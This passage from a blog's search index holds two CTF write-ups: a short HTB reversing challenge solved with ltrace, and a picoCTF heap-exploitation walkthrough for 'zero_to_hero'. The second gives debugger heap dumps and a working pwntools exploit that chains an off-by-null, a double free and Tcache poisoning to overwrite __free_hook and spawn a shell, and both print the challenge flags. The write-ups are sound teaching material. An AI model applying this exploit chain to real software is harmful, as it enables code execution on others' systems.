/lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, stripped  If we run it, it asks for a key:\n$ ./auth Welcome!  We can introduce something and see that it is not correct:\n$ ./baby Insert key: asdf I said, you can't c me!  We can make use of ltrace to see every call to external functions (functions that belong to a library like Glibc):\n$ ltrace ./auth printf(\"Welcome!\\n\"Welcome! ) = 9 malloc(21) = 0x4056b0 fgets(  For example, it uses printf to print the message and fgets to read our input. If we enter some text, we see something really interesting:\n$ ltrace ./baby printf(\"Welcome!\\n\"Welcome! ) = 9 malloc(21) = 0x4056b0 fgets(asdf \"asdf\\n\", 21, 0x7ffff7fa9980) = 0x4056b0 strcmp(\"wh00ps!_y0u_d1d_c_m3\", \"asdf\\n\") = 22 printf(\"I said, you can't c me!\\n\"I said, you can't c me! ) = 24 +++ exited (status 0) +++  It is comparing our input with \u0026quot;wh00ps!_y0u_d1d_c_m3\u0026quot;, so this is the key we need to enter:\n$ ./baby Welcome! wh00ps!_y0u_d1d_c_m3 HTB{wh00ps!_y0u_d1d_c_m3}  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/reversing/you-cant-c-me/","section":"ctf","summary":"Key comparison with strcmp","time":1,"title":"You Cant C Me"},{"contents":"We are given a 64-bit binary called zero_to_hero:\nArch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./'  We also have the Glibc shared library and the loader (version 2.29):\n$ ./ld-2.29.so ./libc.so.6 GNU C Library (Ubuntu GLIBC 2.29-0ubuntu2) stable release version 2.29. Copyright (C) 2019 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Compiled by GNU CC version 8.3.0. libc ABIs: UNIQUE IFUNC ABSOLUTE For bug reporting instructions, please see: \u0026lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs\u0026gt;.  Reverse engineering If we open the binary in Ghidra, we will see this main function:\nvoidmain() { ssize_tlength; longin_FS_OFFSET; intoption; charconfirmation[24]; ulong canary;  canary =*(ulong *) (in_FS_OFFSET +0x28); setvbuf(stdin, NULL, 2, 0); setvbuf(stdout, NULL, 2, 0); setvbuf(stderr, NULL, 2, 0); puts(\"From Zero to Hero\"); puts(\"So, you want to be a hero?\"); length =read(0, confirmation, 0x14); confirmation[length] ='\\0'; if(confirmation[0] !='y') { puts(\"No? Then why are you even here?\"); /* WARNING: Subroutine does not return */ exit(0); } puts(\"Really? Being a hero is hard.\"); puts(\"Fine. I see I can\\'t convince you otherwise.\"); printf(\"It\\'s dangerous to go alone. Take this: %p\\n\", system); while(true) { while(true) { menu(); printf(\"\u0026gt; \"); option =0; __isoc99_scanf(\"%d\", \u0026amp;option); getchar(); if(option !=2) break; remove_superpower(); } if(option ==3) break; if(option !=1) gotoLAB_00400dce; get_superpower(); } puts(\"Giving up?\"); LAB_00400dce: /* WARNING: Subroutine does not return */ exit(0); }  First of all, we need to enter y to use the program. Moreover, we are given the address of system at runtime. Then, we have two options: get_superpower and remove_superpower:\n$ ./zero_to_hero From Zero to Hero So, you want to be a hero? yes Really? Being a hero is hard. Fine. I see I can't convince you otherwise. It's dangerous to go alone. Take this: 0x7fc1bca6ffd0 1. Get a superpower 2. Remove a superpower 3. Exit \u0026gt;  It seems to be a heap exploitation challenge. Let\u0026rsquo;s analyze these two functions.\nAllocation function This is get_superpower:\nvoidget_superpower() { char*p_superpower; ssize_tlength; longin_FS_OFFSET; uintsize; intcount; longcanary; char*superpower; canary =*(long*) (in_FS_OFFSET +0x28); size =0; count =count_superpowers(); if(count \u0026lt;0) { puts(\"You have too many powers!\"); /* WARNING: Subroutine does not return */ exit(-1); } puts(\"Describe your new power.\"); puts(\"What is the length of your description?\"); printf(\"\u0026gt; \"); __isoc99_scanf(\"%u\", \u0026amp;size); getchar(); if(0x408\u0026lt;size) { puts(\"Power too strong!\"); /* WARNING: Subroutine does not return */ exit(-1); } p_superpower =(char*) malloc((ulong) size); superpowers[count] =p_superpower; puts(\"Enter your description: \"); printf(\"\u0026gt; \"); superpower =superpowers[count]; length =read(0, superpowers[count], (ulong)size); superpower[length] ='\\0'; puts(\"Done!\"); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } }  We see that we can allocate chunks on the heap up to size 0x408 and then enter some data. There is a bug in this function in this line of code:\nsuperpower[length] ='\\0';  The problem is that the last element of the superpower character array is at index length - 1, because indeces start at 0. The program will set the last plus one element to a null byte. This bug can be exploited with a technique known as null byte poisoning.\nFree function This is remove_superpower:\nvoidremove_superpower() { longin_FS_OFFSET; uintindex; longcanary; canary =*(long*) (in_FS_OFFSET +0x28); index =0; puts(\"Which power would you like to remove?\"); printf(\"\u0026gt; \"); __isoc99_scanf(\"%u\", \u0026amp;index); getchar(); if(6\u0026lt;index) { puts(\"Invalid index!\"); /* WARNING: Subroutine does not return */ exit(-1); } free(superpowers[index]); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } }  Basically, we select the index of the chunk and it is freed using free, as simple as that.\nExploit strategy We will need to exploit the existing bug (usually called off-by-null) using null byte poisoning. Notice that Glibc 2.29 uses Tcache.\nThe idea is simple for experienced heap pwners. The objective is to use the off-by-null to modify the next chunk\u0026rsquo;s size and cause confusion to the memory allocator.\nWe can start by creating three chunks:\n A: size 0x108 B: size 0x108 C: size 0xf8  Their effective sizes on the heap will be 0x110, 0x110 and 0x100, respectively.\nNow, we will free B, then C and then A. When allocating a chunk sized 0x108, it will be placed where A was before, and we will exploit the off-by-null to modify B\u0026rsquo;s effective size to 0x100.\nAt this point, we can free B again, and the Tcache won\u0026rsquo;t complain because it has s different size. Thus, we have a double free because we have the same chunk B inside lists of size 0x100 and 0x110.\nTherefore, we can perform a Tcache poisoning attack to modify __free_hook to be system (we already know the address, and thus, we can bypass ASLR). When calling free on chunk C (which will contain \u0026quot;/bin/sh\u0026quot;), __free_hook will pop a shell.\nDebugging with GDB Let\u0026rsquo;s analyze the above using GDB:\n We do the three allocations:  $ gdb -q zero_to_hero pwndbg: loaded 198 commands. Type pwndbg [filter] for a list. pwndbg: created $rebase, $ida gdb functions (can be used with print/break) Reading symbols from zero_to_hero... (No debugging symbols found in zero_to_hero) pwndbg\u0026gt; run Starting program: ./zero_to_hero From Zero to Hero So, you want to be a hero? y Really? Being a hero is hard. Fine. I see I can't convince you otherwise. It's dangerous to go alone. Take this: 0x7ffff7e31fd0 1. Get a superpower 2. Remove a superpower 3. Exit \u0026gt; 1 Describe your new power. What is the length of your description? \u0026gt; 264 Enter your description: \u0026gt; AAAA Done! 1. Get a superpower 2. Remove a superpower 3. Exit \u0026gt; 1 Describe your new power. What is the length of your description? \u0026gt; 264 Enter your description: \u0026gt; BBBB Done! 1. Get a superpower 2. Remove a superpower 3. Exit \u0026gt; 1 Describe your new power. What is the length of your description? \u0026gt; 248 Enter your description: \u0026gt; CCCC Done! 1. Get a superpower 2. Remove a superpower 3. Exit \u0026gt; ^C Program received signal SIGINT, Interrupt. 0x00007ffff7eebf81 in __GI___libc_read (fd=0, buf=0x7ffff7fc3a83 \u0026lt;_IO_2_1_stdin_+131\u0026gt;, nbytes=1) at ../sysdeps/unix/sysv/linux/read.c:26 26 ../sysdeps/unix/sysv/linux/read.c: No such file or directory.  pwndbg\u0026gt; vis_heap_chunks 0x603000 0x0000000000000000 0x0000000000000251 ........Q....... 0x603010 0x0000000000000000 0x0000000000000000 ................ 0x603020 0x0000000000000000 0x0000000000000000 ................ 0x603030 0x0000000000000000 0x0000000000000000 ................ 0x603040 0x0000000000000000 0x0000000000000000 ................ 0x603050 0x0000000000000000 0x0000000000000000 ................ 0x603060 0x0000000000000000 0x0000000000000000 ................ 0x603070 0x0000000000000000 0x0000000000000000 ................ 0x603080 0x0000000000000000 0x0000000000000000 ................ 0x603090 0x0000000000000000 0x0000000000000000 ................ 0x6030a0 0x0000000000000000 0x0000000000000000 ................ 0x6030b0 0x0000000000000000 0x0000000000000000 ................ 0x6030c0 0x0000000000000000 0x0000000000000000 ................ 0x6030d0 0x0000000000000000 0x0000000000000000 ................ 0x6030e0 0x0000000000000000 0x0000000000000000 ................ 0x6030f0 0x0000000000000000 0x0000000000000000 ................ 0x603100 0x0000000000000000 0x0000000000000000 ................ 0x603110 0x0000000000000000 0x0000000000000000 ................ 0x603120 0x0000000000000000 0x0000000000000000 ................ 0x603130 0x0000000000000000 0x0000000000000000 ................ 0x603140 0x0000000000000000 0x0000000000000000 ................ 0x603150 0x0000000000000000 0x0000000000000000 ................ 0x603160 0x0000000000000000 0x0000000000000000 ................ 0x603170 0x0000000000000000 0x0000000000000000 ................ 0x603180 0x0000000000000000 0x0000000000000000 ................ 0x603190 0x0000000000000000 0x0000000000000000 ................ 0x6031a0 0x0000000000000000 0x0000000000000000 ................ 0x6031b0 0x0000000000000000 0x0000000000000000 ................ 0x6031c0 0x0000000000000000 0x0000000000000000 ................ 0x6031d0 0x0000000000000000 0x0000000000000000 ................ 0x6031e0 0x0000000000000000 0x0000000000000000 ................ 0x6031f0 0x0000000000000000 0x0000000000000000 ................ 0x603200 0x0000000000000000 0x0000000000000000 ................ 0x603210 0x0000000000000000 0x0000000000000000 ................ 0x603220 0x0000000000000000 0x0000000000000000 ................ 0x603230 0x0000000000000000 0x0000000000000000 ................ 0x603240 0x0000000000000000 0x0000000000000000 ................ 0x603250 0x0000000000000000 0x0000000000000111 ................ 0x603260 0x0000000a41414141 0x0000000000000000 AAAA............ 0x603270 0x0000000000000000 0x0000000000000000 ................ 0x603280 0x0000000000000000 0x0000000000000000 ................ 0x603290 0x0000000000000000 0x0000000000000000 ................ 0x6032a0 0x0000000000000000 0x0000000000000000 ................ 0x6032b0 0x0000000000000000 0x0000000000000000 ................ 0x6032c0 0x0000000000000000 0x0000000000000000 ................ 0x6032d0 0x0000000000000000 0x0000000000000000 ................ 0x6032e0 0x0000000000000000 0x0000000000000000 ................ 0x6032f0 0x0000000000000000 0x0000000000000000 ................ 0x603300 0x0000000000000000 0x0000000000000000 ................ 0x603310 0x0000000000000000 0x0000000000000000 ................ 0x603320 0x0000000000000000 0x0000000000000000 ................ 0x603330 0x0000000000000000 0x0000000000000000 ................ 0x603340 0x0000000000000000 0x0000000000000000 ................ 0x603350 0x0000000000000000 0x0000000000000000 ................ 0x603360 0x0000000000000000 0x0000000000000111 ................ 0x603370 0x0000000a42424242 0x0000000000000000 BBBB............ 0x603380 0x0000000000000000 0x0000000000000000 ................ 0x603390 0x0000000000000000 0x0000000000000000 ................ 0x6033a0 0x0000000000000000 0x0000000000000000 ................ 0x6033b0 0x0000000000000000 0x0000000000000000 ................ 0x6033c0 0x0000000000000000 0x0000000000000000 ................ 0x6033d0 0x0000000000000000 0x0000000000000000 ................ 0x6033e0 0x0000000000000000 0x0000000000000000 ................ 0x6033f0 0x0000000000000000 0x0000000000000000 ................ 0x603400 0x0000000000000000 0x0000000000000000 ................ 0x603410 0x0000000000000000 0x0000000000000000 ................ 0x603420 0x0000000000000000 0x0000000000000000 ................ 0x603430 0x0000000000000000 0x0000000000000000 ................ 0x603440 0x0000000000000000 0x0000000000000000 ................ 0x603450 0x0000000000000000 0x0000000000000000 ................ 0x603460 0x0000000000000000 0x0000000000000000 ................ 0x603470 0x0000000000000000 0x0000000000000101 ................ 0x603480 0x0000000a43434343 0x0000000000000000 CCCC............ 0x603490 0x0000000000000000 0x0000000000000000 ................ 0x6034a0 0x0000000000000000 0x0000000000000000 ................ 0x6034b0 0x0000000000000000 0x0000000000000000 ................ 0x6034c0 0x0000000000000000 0x0000000000000000 ................ 0x6034d0 0x0000000000000000 0x0000000000000000 ................ 0x6034e0 0x0000000000000000 0x0000000000000000 ................ 0x6034f0 0x0000000000000000 0x0000000000000000 ................ 0x603500 0x0000000000000000 0x0000000000000000 ................ 0x603510 0x0000000000000000 0x0000000000000000 ................ 0x603520 0x0000000000000000 0x0000000000000000 ................ 0x603530 0x0000000000000000 0x0000000000000000 ................ 0x603540 0x0000000000000000 0x0000000000000000 ................ 0x603550 0x0000000000000000 0x0000000000000000 ................ 0x603560 0x0000000000000000 0x0000000000000000 ................ 0x603570 0x0000000000000000 0x0000000000020a91 ................ \u0026lt;-- Top chunk pwndbg\u0026gt; heap Allocated chunk | PREV_INUSE Addr: 0x603000 Size: 0x251 Allocated chunk | PREV_INUSE Addr: 0x603250 Size: 0x111 Allocated chunk | PREV_INUSE Addr: 0x603360 Size: 0x111 Allocated chunk | PREV_INUSE Addr: 0x603470 Size: 0x101 Top chunk | PREV_INUSE Addr: 0x603570 Size: 0x20a91   We free them:  pwndbg\u0026gt; continue Continuing. 2 Which power would you like to remove? \u0026gt; 1 1. Get a superpower 2. Remove a superpower 3. Exit \u0026gt; 2 Which power would you like to remove? \u0026gt; 2 1. Get a superpower 2. Remove a superpower 3. Exit \u0026gt; 2 Which power would you like to remove? \u0026gt; 0 1. Get a superpower 2. Remove a superpower 3. Exit \u0026gt; ^C Program received signal SIGINT, Interrupt. 0x00007ffff7eebf81 in __GI___libc_read (fd=0, buf=0x7ffff7fc3a83 \u0026lt;_IO_2_1_stdin_+131\u0026gt;, nbytes=1) at ../sysdeps/unix/sysv/linux/read.c:26 26 in ../sysdeps/unix/sysv/linux/read.c  pwndbg\u0026gt; tcachebins tcachebins 0x100 [ 1]: 0x603480 ◂— 0x0 0x110 [ 2]: 0x603260 —▸ 0x603370 ◂— 0x0 pwndbg\u0026gt; heap Allocated chunk | PREV_INUSE Addr: 0x603000 Size: 0x251 Free chunk (tcache) | PREV_INUSE Addr: 0x603250 Size: 0x111 fd: 0x603370 Free chunk (tcache) | PREV_INUSE Addr: 0x603360 Size: 0x111 fd: 0x00 Free chunk (tcache) | PREV_INUSE Addr: 0x603470 Size: 0x101 fd: 0x00 Top chunk | PREV_INUSE Addr: 0x603570 Size: 0x20a91   We allocate a chunk size 0x108 and enter exactly 0x108 bytes to exploit the off-by-null:  pwndbg\u0026gt; shell python3 -c 'print(\"A\" * 264)' AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA pwndbg\u0026gt; continue Continuing. 1 Describe your new power. What is the length of your description? \u0026gt; 264 Enter your description: \u0026gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Done! 1. Get a superpower 2. Remove a superpower 3. Exit \u0026gt; ^C Program received signal SIGINT, Interrupt. 0x00007ffff7eebf81 in __GI___libc_read (fd=0, buf=0x7ffff7fc3a83 \u0026lt;_IO_2_1_stdin_+131\u0026gt;, nbytes=1) at ../sysdeps/unix/sysv/linux/read.c:26 26 in ../sysdeps/unix/sysv/linux/read.c  pwndbg\u0026gt; vis_heap_chunks 0x603000 0x0000000000000000 0x0000000000000251 ........Q....... 0x603010 0x0000000000000000 0x0101000000000000 ................ 0x603020 0x0000000000000000 0x0000000000000000 ................ 0x603030 0x0000000000000000 0x0000000000000000 ................ 0x603040 0x0000000000000000 0x0000000000000000 ................ 0x603050 0x0000000000000000 0x0000000000000000 ................ 0x603060 0x0000000000000000 0x0000000000000000 ................ 0x603070 0x0000000000000000 0x0000000000000000 ................ 0x603080 0x0000000000000000 0x0000000000000000 ................ 0x603090 0x0000000000000000 0x0000000000000000 ................ 0x6030a0 0x0000000000000000 0x0000000000000000 ................ 0x6030b0 0x0000000000000000 0x0000000000000000 ................ 0x6030c0 0x0000000000603480 0x0000000000603370 .4`.....p3`..... 0x6030d0 0x0000000000000000 0x0000000000000000 ................ 0x6030e0 0x0000000000000000 0x0000000000000000 ................ 0x6030f0 0x0000000000000000 0x0000000000000000 ................ 0x603100 0x0000000000000000 0x0000000000000000 ................ 0x603110 0x0000000000000000 0x0000000000000000 ................ 0x603120 0x0000000000000000 0x0000000000000000 ................ 0x603130 0x0000000000000000 0x0000000000000000 ................ 0x603140 0x0000000000000000 0x0000000000000000 ................ 0x603150 0x0000000000000000 0x0000000000000000 ................ 0x603160 0x0000000000000000 0x0000000000000000 ................ 0x603170 0x0000000000000000 0x0000000000000000 ................ 0x603180 0x0000000000000000 0x0000000000000000 ................ 0x603190 0x0000000000000000 0x0000000000000000 ................ 0x6031a0 0x0000000000000000 0x0000000000000000 ................ 0x6031b0 0x0000000000000000 0x0000000000000000 ................ 0x6031c0 0x0000000000000000 0x0000000000000000 ................ 0x6031d0 0x0000000000000000 0x0000000000000000 ................ 0x6031e0 0x0000000000000000 0x0000000000000000 ................ 0x6031f0 0x0000000000000000 0x0000000000000000 ................ 0x603200 0x0000000000000000 0x0000000000000000 ................ 0x603210 0x0000000000000000 0x0000000000000000 ................ 0x603220 0x0000000000000000 0x0000000000000000 ................ 0x603230 0x0000000000000000 0x0000000000000000 ................ 0x603240 0x0000000000000000 0x0000000000000000 ................ 0x603250 0x0000000000000000 0x0000000000000111 ................ 0x603260 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA 0x603270 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA 0x603280 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA 0x603290 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA 0x6032a0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA 0x6032b0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA 0x6032c0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA 0x6032d0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA 0x6032e0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA 0x6032f0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA 0x603300 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA 0x603310 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA 0x603320 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA 0x603330 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA 0x603340 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA 0x603350 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA 0x603360 0x4141414141414141 0x0000000000000100 AAAAAAAA........ 0x603370 0x0000000000000000 0x0000000000603010 .........0`..... \u0026lt;-- tcachebins[0x110][0/1] 0x603380 0x0000000000000000 0x0000000000000000 ................ 0x603390 0x0000000000000000 0x0000000000000000 ................ 0x6033a0 0x0000000000000000 0x0000000000000000 ................ 0x6033b0 0x0000000000000000 0x0000000000000000 ................ 0x6033c0 0x0000000000000000 0x0000000000000000 ................ 0x6033d0 0x0000000000000000 0x0000000000000000 ................ 0x6033e0 0x0000000000000000 0x0000000000000000 ................ 0x6033f0 0x0000000000000000 0x0000000000000000 ................ 0x603400 0x0000000000000000 0x0000000000000000 ................ 0x603410 0x0000000000000000 0x0000000000000000 ................ 0x603420 0x0000000000000000 0x0000000000000000 ................ 0x603430 0x0000000000000000 0x0000000000000000 ................ 0x603440 0x0000000000000000 0x0000000000000000 ................ 0x603450 0x0000000000000000 0x0000000000000000 ................ pwndbg\u0026gt; heap Allocated chunk | PREV_INUSE Addr: 0x603000 Size: 0x251 Allocated chunk | PREV_INUSE Addr: 0x603250 Size: 0x111 Allocated chunk Addr: 0x603360 Size: 0x100 Allocated chunk Addr: 0x603460 Size: 0x00  The above commands fail because we have corrupted the heap metadata of chunk B (now the size field is 0x100). We can visualize the full heap (without colors) like this:\npwndbg\u0026gt; x/180gx 0x603000 0x603000: 0x0000000000000000 0x0000000000000251 0x603010: 0x0000000000000000 0x0101000000000000 0x603020: 0x0000000000000000 0x0000000000000000 0x603030: 0x0000000000000000 0x0000000000000000 0x603040: 0x0000000000000000 0x0000000000000000 0x603050: 0x0000000000000000 0x0000000000000000 0x603060: 0x0000000000000000 0x0000000000000000 0x603070: 0x0000000000000000 0x0000000000000000 0x603080: 0x0000000000000000 0x0000000000000000 0x603090: 0x0000000000000000 0x0000000000000000 0x6030a0: 0x0000000000000000 0x0000000000000000 0x6030b0: 0x0000000000000000 0x0000000000000000 0x6030c0: 0x0000000000603480 0x0000000000603370 0x6030d0: 0x0000000000000000 0x0000000000000000 0x6030e0: 0x0000000000000000 0x0000000000000000 0x6030f0: 0x0000000000000000 0x0000000000000000 0x603100: 0x0000000000000000 0x0000000000000000 0x603110: 0x0000000000000000 0x0000000000000000 0x603120: 0x0000000000000000 0x0000000000000000 0x603130: 0x0000000000000000 0x0000000000000000 0x603140: 0x0000000000000000 0x0000000000000000 0x603150: 0x0000000000000000 0x0000000000000000 0x603160: 0x0000000000000000 0x0000000000000000 0x603170: 0x0000000000000000 0x0000000000000000 0x603180: 0x0000000000000000 0x0000000000000000 0x603190: 0x0000000000000000 0x0000000000000000 0x6031a0: 0x0000000000000000 0x0000000000000000 0x6031b0: 0x0000000000000000 0x0000000000000000 0x6031c0: 0x0000000000000000 0x0000000000000000 0x6031d0: 0x0000000000000000 0x0000000000000000 0x6031e0: 0x0000000000000000 0x0000000000000000 0x6031f0: 0x0000000000000000 0x0000000000000000 0x603200: 0x0000000000000000 0x0000000000000000 0x603210: 0x0000000000000000 0x0000000000000000 0x603220: 0x0000000000000000 0x0000000000000000 0x603230: 0x0000000000000000 0x0000000000000000 0x603240: 0x0000000000000000 0x0000000000000000 0x603250: 0x0000000000000000 0x0000000000000111 0x603260: 0x4141414141414141 0x4141414141414141 0x603270: 0x4141414141414141 0x4141414141414141 0x603280: 0x4141414141414141 0x4141414141414141 0x603290: 0x4141414141414141 0x4141414141414141 0x6032a0: 0x4141414141414141 0x4141414141414141 0x6032b0: 0x4141414141414141 0x4141414141414141 0x6032c0: 0x4141414141414141 0x4141414141414141 0x6032d0: 0x4141414141414141 0x4141414141414141 0x6032e0: 0x4141414141414141 0x4141414141414141 0x6032f0: 0x4141414141414141 0x4141414141414141 0x603300: 0x4141414141414141 0x4141414141414141 0x603310: 0x4141414141414141 0x4141414141414141 0x603320: 0x4141414141414141 0x4141414141414141 0x603330: 0x4141414141414141 0x4141414141414141 0x603340: 0x4141414141414141 0x4141414141414141 0x603350: 0x4141414141414141 0x4141414141414141 0x603360: 0x4141414141414141 0x0000000000000100 0x603370: 0x0000000000000000 0x0000000000603010 0x603380: 0x0000000000000000 0x0000000000000000 0x603390: 0x0000000000000000 0x0000000000000000 0x6033a0: 0x0000000000000000 0x0000000000000000 0x6033b0: 0x0000000000000000 0x0000000000000000 0x6033c0: 0x0000000000000000 0x0000000000000000 0x6033d0: 0x0000000000000000 0x0000000000000000 0x6033e0: 0x0000000000000000 0x0000000000000000 0x6033f0: 0x0000000000000000 0x0000000000000000 0x603400: 0x0000000000000000 0x0000000000000000 0x603410: 0x0000000000000000 0x0000000000000000 0x603420: 0x0000000000000000 0x0000000000000000 0x603430: 0x0000000000000000 0x0000000000000000 0x603440: 0x0000000000000000 0x0000000000000000 0x603450: 0x0000000000000000 0x0000000000000000 0x603460: 0x0000000000000000 0x0000000000000000 0x603470: 0x0000000000000000 0x0000000000000101 0x603480: 0x0000000000000000 0x0000000000603010 0x603490: 0x0000000000000000 0x0000000000000000 0x6034a0: 0x0000000000000000 0x0000000000000000 0x6034b0: 0x0000000000000000 0x0000000000000000 0x6034c0: 0x0000000000000000 0x0000000000000000 0x6034d0: 0x0000000000000000 0x0000000000000000 0x6034e0: 0x0000000000000000 0x0000000000000000 0x6034f0: 0x0000000000000000 0x0000000000000000 0x603500: 0x0000000000000000 0x0000000000000000 0x603510: 0x0000000000000000 0x0000000000000000 0x603520: 0x0000000000000000 0x0000000000000000 0x603530: 0x0000000000000000 0x0000000000000000 0x603540: 0x0000000000000000 0x0000000000000000 0x603550: 0x0000000000000000 0x0000000000000000 0x603560: 0x0000000000000000 0x0000000000000000 0x603570: 0x0000000000000000 0x0000000000020a91 0x603580: 0x0000000000000000 0x0000000000000000 0x603590: 0x0000000000000000 0x0000000000000000   We free chunk B again:  pwndbg\u0026gt; tcachebins tcachebins 0x100 [ 1]: 0x603480 ◂— 0x0 0x110 [ 1]: 0x603370 ◂— 0x0 pwndbg\u0026gt; continue Continuing. 2 Which power would you like to remove? \u0026gt; 1 1. Get a superpower 2. Remove a superpower 3. Exit \u0026gt; ^C Program received signal SIGINT, Interrupt. 0x00007ffff7eebf81 in __GI___libc_read (fd=0, buf=0x7ffff7fc3a83 \u0026lt;_IO_2_1_stdin_+131\u0026gt;, nbytes=1) at ../sysdeps/unix/sysv/linux/read.c:26 26 in ../sysdeps/unix/sysv/linux/read.c  pwndbg\u0026gt; tcachebins tcachebins 0x100 [ 2]: 0x603370 —▸ 0x603480 ◂— 0x0 0x110 [ 1]: 0x603370 —▸ 0x603480 ◂— ...  As we can see, we got the same chunk address in two Tcache lists, so we have a double free vulnerability that can be exploited with a Tcache poisoning attack. For instance, let\u0026rsquo;s allocate a chunk sized 0xf8:\npwndbg\u0026gt; continue Continuing. 1 Describe your new power. What is the length of your description? \u0026gt; 248 Enter your description: \u0026gt; asdf Done! 1. Get a superpower 2. Remove a superpower 3. Exit \u0026gt; ^C Program received signal SIGINT, Interrupt. 0x00007ffff7eebf81 in __GI___libc_read (fd=0, buf=0x7ffff7fc3a83 \u0026lt;_IO_2_1_stdin_+131\u0026gt;, nbytes=1) at ../sysdeps/unix/sysv/linux/read.c:26 26 in ../sysdeps/unix/sysv/linux/read.c  pwndbg\u0026gt; tcachebins tcachebins 0x100 [ 1]: 0x603480 ◂— 0x0 0x110 [ 1]: 0x603370 ◂— 0xa66647361 /* 'asdf\\n' */  There we have it. We have modified the fd pointer of a freed chunk, so we got control of the next chunk address of size 0x108:\npwndbg\u0026gt; continue Continuing. 1 Describe your new power. What is the length of your description? \u0026gt; 264 Enter your description: \u0026gt; xxxx Done! 1. Get a superpower 2. Remove a superpower 3. Exit \u0026gt; 1 Describe your new power. What is the length of your description? \u0026gt; 264 Program received signal SIGSEGV, Segmentation fault. tcache_get (tc_idx=15) at malloc.c:2950 2950 malloc.c: No such file or directory.  Obviously, we got a segmentation fault because asdf is not a valid address. This was just a proof of concept of how the exploit works.\nFinal exploit This will be the main function of our exploit:\ndefmain(): p=get_process() p.sendlineafter(b'So, you want to be a hero?\\n', b'y') p.recvuntil(b\"It's dangerous to go alone. Take this: \") system_addr=int(p.recvline().decode(), 16) glibc.address=system_addr-glibc.sym.system log.success(f'Glibc base address: {hex(glibc.address)}') alloc(p, 0x108, b'AAAA') alloc(p, 0x108, b'BBBB') alloc(p, 0x0f8, b'CCCC') free(p, 1) free(p, 2) free(p, 0) alloc(p, 0x108, b'A'*0x108) free(p, 1) alloc(p, 0x0f8, p64(glibc.sym.__free_hook)) alloc(p, 0x108, b'/bin/sh\\0') alloc(p, 0x108, p64(system_addr)) free(p, 1) p.interactive()  It works in our local environment:\n$ python3 solve.py [*] './zero_to_hero' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./' [+] Starting local process './zero_to_hero': pid 3010377 [+] Glibc base address: 0x7ff90e108000 [*] Switching to interactive mode $ ls ld-2.29.so libc.so.6 solve.py zero_to_hero  Flag And also remotely:\n$ python3 solve.py jupiter.challenges.picoctf.org 29476 [*] './zero_to_hero' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./' [+] Opening connection to jupiter.challenges.picoctf.org on port 29476: Done [+] Glibc base address: 0x7fe979b45000 [*] Switching to interactive mode $ ls flag.txt ld-2.29.so libc.so.6 xinet_startup.sh zero_to_hero $ cat flag.txt picoCTF{i_th0ught_2.29_f1x3d_d0ubl3_fr33?_wuqzpzof}  The full exploit can be found in here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/zero_to_hero/","section":"ctf","summary":"picoCTF 2019. 500 points. 64-bit binary. Heap exploitation. Null byte poisoning. Tcache poisoning","time":13,"title":"zero_to_hero"}]